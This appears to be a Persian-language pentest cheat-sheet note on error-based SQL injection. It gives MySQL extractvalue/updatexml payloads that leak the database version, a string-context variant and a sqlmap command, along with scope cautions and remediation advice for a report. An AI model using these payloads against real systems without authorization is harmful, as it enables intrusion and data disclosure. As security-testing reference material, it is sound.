---
tags: [web, sqli, error-based]
---

# Error-Based SQL Injection

## کاربرد

اگر برنامه بخشی از خطای دیتابیس را در پاسخ نشان می‌دهد، ممکن است بتوان نسخه یا داده محدود را از مسیر خطا اثبات کرد. ابتدا بررسی کن که نمایش خطا در Scope مجاز است و اطلاعات حساس واقعی افشا نمی‌شود.

## MySQL — نمونه نمایش نسخه

```sql
AND extractvalue(1,concat(0x7e,version()))-- -
```

نمونه دیگر:

```sql
AND updatexml(1,concat(0x7e,version()),1)-- -
```

در Context رشته‌ای، Prefix را اضافه کن:

```sql
' AND extractvalue(1,concat(0x7e,version()))-- -
```

## sqlmap

```bash
sqlmap -r request.txt -p id \
  --technique=E --batch
```

## بررسی نتیجه

- آیا پیام خطا واقعاً از دیتابیس است یا صفحه خطای عمومی؟
- آیا نشانگر `~` یا مقدار نسخه در پاسخ دیده می‌شود؟
- آیا اطلاعات خطا در Production لاگ یا پاسخ ذخیره می‌شود؟

## راه‌حل برای گزارش

- نمایش خطای دیتابیس به کاربر غیرفعال شود.
- Queryها Parameterized شوند.
- خطاهای داخلی با Correlation ID و بدون جزئیات حساس لاگ شوند.
